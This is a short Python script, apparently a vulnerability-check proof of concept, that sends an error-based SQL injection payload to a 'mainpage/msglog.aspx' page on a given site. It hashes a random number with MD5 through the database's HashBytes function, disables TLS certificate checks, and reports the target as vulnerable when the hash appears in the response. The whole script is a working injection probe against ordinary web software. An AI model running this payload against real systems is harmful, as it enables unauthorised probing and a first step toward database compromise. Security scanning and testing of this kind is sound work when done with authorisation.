import requests,re,urllib3
from hashlib import md5

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
rand=randomInt(100000, 200000)

def scan(baseurl):
	url=baseurl+"mainpage/msglog.aspx?user=1%27%20and%201=convert(int,(select%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27"+str(rand)+"%27))))--"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	rand1 = str(rand).encode()
	if md5(rand1).hexdigest() in response.text:
		r0=True
	else:
		r0=False
	if r0:
		return True
	else:
		return False
